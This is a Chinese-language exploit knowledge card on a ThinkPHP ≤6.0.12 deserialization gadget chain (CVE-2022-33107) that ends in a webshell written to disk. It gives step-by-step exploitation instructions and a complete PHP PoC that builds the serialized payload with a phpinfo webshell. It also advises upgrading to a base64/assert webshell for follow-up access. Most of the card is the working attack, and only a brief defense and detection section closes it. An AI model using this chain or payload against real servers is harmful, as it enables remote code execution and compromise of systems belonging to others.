---
id: web-php-deserialization-thinkphp6-model-destruct-checkallowfields-output-write-webshell
title: ThinkPHP ≤6.0.12 Model 链后段：checkAllowFields→db 拼接触发 Url::__toString→Output::__call→writeln→League\Flysystem\File::write→session File::write 写 WebShell（CVE-2022-33107）
type: scenario
domain: web
path: web/php/deserialization
technique: thinkphp6-model-url-output-file-write-webshell
aliases:
- CVE-2022-33107
- ThinkPHP Url __toString
- think\console\Output __call
- getDomainBind Output block writeln
- League Flysystem File write
- think\session\driver\File write
tags:
- php
- thinkphp
- deserialization
- pop-chain
- tostring
- call
- file-write
- webshell
cve:
- CVE-2022-33107
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
affected_versions: thinkphp<=6.0.12
verification:
  verified_by: verifier-T2-W5
  verified_at: '2026-11-08T14:38:45+08:00'
  notes: 已对照原文核对：Model.__destruct(lazySave)→save→insertData→checkAllowFields→db 的 name/table 拼接触发 Url::__toString→build→route->getDomainBind 落到 Output::__call→block→writeln→write→Flysystem\File::write→session\File::write→file_put_contents，写入内容 <getDomainBind><?=...//</getDomainBind> 与原文图21-29一致；未验证点：原文靶场为 6.0.12，6.0.13 起修复细节未逐版本核实
---

## 一句话结论

ThinkPHP ≤6.0.12 里，把 `think\model\Pivot` 的 `table` 设成 `think\route\Url` 对象、并让 `Url->route` 指向 `think\console\Output`，就能在 `Model::__destruct → save → insertData → checkAllowFields → db()` 的字符串拼接处触发 `Url::__toString → build()`；`build()` 里 `$this->route->getDomainBind(...)` 的方法不存在会被 `Output::__call` 接管，一路走到 `writeln → write → $this->handle->write`，`handle` 为 `League\Flysystem\File` 时最终由 `think\session\driver\File::write → file_put_contents` 把 `<getDomainBind><payload></getDomainBind>` 写进指定 PHP 文件，得到 WebShell。

## 原理

- **前半链（可复用现成卡）**：`Model::__destruct` 的 `lazySave` → `save()` → `insertData()` → `checkAllowFields()`，当 `field`/`schema` 为空时走 `db()`；`db()` 里 `->name($this->name . $this->suffix)` 与 `$query->table($this->table . $this->suffix)` 都会把对象拼成字符串，从而调用该对象的 `__toString()`。把 `table` 设成 `think\route\Url` 即可。
- **`Url::__toString → build()`**：`build()` 先取 `$url/$suffix/$domain/$request/$vars` 等属性；`$this->app` 可控（设成 `think\Middleware`），`$this->domain` 为攻击者要写的 PHP 代码。随后执行 `$bind = $this->route->getDomainBind($domain && is_string($domain) ? $domain : null);`；`Url::build` 里并没有 `getDomainBind` 方法，于是 PHP 调用 `$this->route` 上的魔术方法 `__call`。
- **`Output::__call` 是桥**：`think\console\Output::__call($method, $args)` 执行 `call_user_func_array([$this, 'block'], $args);` —— 于是 `route` 设为 `Output` 对象时，任意方法名都被转成 `block()` 调用。
- **block → writeln → write**：`block()` 拼出 `"<{$style}>{$message}</{$style}>"`（`style` 取 `$this->styles` 里预先塞入的 `getDomainBind`，`message` 是 `$domain` 即 payload），再 `writeln()` → `write($messages, true, $type)` → `$this->handle->write($messages, $newline, $type)`。
- **`handle` 设为 `League\Flysystem\File`**：其 `write($content)` 是 `return $this->filesystem->write($this->path, $content);`；再把 `filesystem` 设为 `think\session\driver\File`（其 `write()` 末尾 `return $this->writeFile($filename, $data);`，`writeFile` 就是 `file_put_contents($path, $content, LOCK_EX)`），`path`/`filename` 由 payload 控制 —— 整条链落到写任意文件。
- **写入内容可控且能成马**：payload 直接作为 `Url->domain`，会被包进 `<getDomainBind>...</getDomainBind>` 标签写进文件；把 payload 写成 `<?= phpinfo(); exit();//` 时，PHP 短标签在默认配置下会被执行，后面的 `</getDomainBind>` 被 `//` 注释掉。
- **为什么 `file_put_contents` 之前的参数都能“恰好对”**：整条链每一环都靠“属性可控 + 方法名存在但语义被复用”推进（`__call` 把任意方法转成 block、`write` 把任意内容原样落盘），不需要任何一处校验。

## 触发条件

- ThinkPHP ≤6.0.12，classpath 含 `league/flysystem`（`League\Flysystem\File`）、`think\console\Output`、`think\session\driver\File`、`think\route\Url`、`think\model\Pivot`。
- 存在可控 `unserialize` 入口（控制器、Session、缓存等），无 `allowed_classes` 限制。
- 写入目录可写且可被 Web 访问（`session` 驱动的 `path` 指向 Web 目录，或 `getFileName` 生成的路径落在其中）。
- 未禁用 `file_put_contents`，PHP 短标签（`<?=`）在目标配置下可用（或 payload 换成 `<?php ... ?>` 以适配 `short_open_tag=Off`）。

## 利用步骤

1. 确认版本与组件：`composer.lock` 里 `topthink/framework` ≤6.0.12 且 `league/flysystem` 存在。
2. 构造 payload：`Pivot`（`lazySave=true`、`withEvent=false`、`table=Url 对象`）、`Url`（`domain=payload`、`app=Middleware`、`route=Output`）、`Output`（`styles=['getDomainBind']`、`handle=Flysystem\File`）、`Flysystem\File`（`path='shell.php'`、`filesystem=session\File`）、`session\File`（`config['path']` 指向 Web 目录、`filename`/`name` 决定落盘名）。
3. `serialize` + `urlencode` 投递，观察是否生成 `shell.php`。
4. 访问 `shell.php` 验证执行；若路径不对，调整 `session\File` 的 `filename`/`config['path']` 或 `Flysystem\File` 的 `path`（可 `../`）。
5. payload 换成长 webshell（base64 + `assert`）以便后续操作。

## PoC

```php
<?php
namespace think\model\concern { trait Attribute { private $data = ['huahua']; } }
namespace think\view\driver { class Php {} }
namespace think\session\driver { class File {} }
namespace League\Flysystem {
    class File {
        protected $path;
        protected $filesystem;
        public function __construct($File){ $this->path='huahua.php'; $this->filesystem=$File; }
    }
}
namespace think\console {
    use League\Flysystem\File;
    class Output {
        protected $styles=[];
        private $handle;
        public function __construct($File){ $this->styles[]='getDomainBind'; $this->handle=new File($File); }
    }
}
namespace think {
    abstract class Model {
        use model\concern\Attribute;
        private $lazySave; protected $withEvent; protected $table;
        function __construct($cmd,$File){
            $this->lazySave = true; $this->withEvent = false;
            $this->table = new route\Url(new Middleware,new console\Output($File),$cmd);
        }
    }
    class Middleware { public $request = 2333; }
}
namespace think\model { use think\Model; class Pivot extends Model {} }
namespace think\route {
    class Url {
        protected $url = 'a:'; protected $domain; protected $app; protected $route;
        function __construct($app,$route,$cmd){ $this->domain=$cmd; $this->app=$app; $this->route=$route; }
    }
}
namespace {
    $zoe='<?= phpinfo(); exit();//';
    echo urlencode(serialize(new think\Model\Pivot($zoe, new think\session\driver\File)));
}
```

写入文件后的内容形态：

```text
<getDomainBind><?= phpinfo(); exit();//</getDomainBind>
```

## 变体与关联

- 变体：`Output` 的 `styles` 换成其他字符串即改变包裹标签；`handle` 换成任意具备 `write($content)` 的对象；`filesystem` 换成其他具备 `write($path,$content)` 的实现（如 `think\session\driver\File` 的其它 handler）。
- 变体：前半链也可替换为 [[web-php-deserialization-thinkphp6-model-destruct-tostring-chain]] 描述的其它 `__toString` 触发点。
- 关联：[[web-php-deserialization-thinkphp6-model-destruct-tostring-chain]]（前半链细节）、[[web-php-deserialization-thinkphp6-flysystem-cachestore-serialize-system-rce]]（同组件的 system sink）、[[web-php-deserialization-flysystem-adapter-cache-webshell]]（`file_put_contents` 另一入口）。
- 边界：6.0.13+ 修复或移除相关 gadget、`unserialize` 白名单、写入目录不可写、`file_put_contents` 被禁时链失效。

## 检测与防御

- 升级 ThinkPHP 到修复版本；移除/审计 `league/flysystem` 与 `think\console\Output` 的可利用组合。
- 不可信输入禁止对象反序列化，必须用时白名单并禁 `think\`、`League\Flysystem\` 前缀。
- Web 目录不可运行期写入；session 文件目录禁止 PHP 解析（`session.save_path` 放到非 Web 目录）。
- 检测：反序列化参数中出现 `think%5Croute%5CUrl`、`think%5Cconsole%5COutput`、`League%5CFlysystem`；Web 目录出现内容含 `<getDomainBind>` 的新 php 文件；短标签 `<?=` 出现在非模板文件。
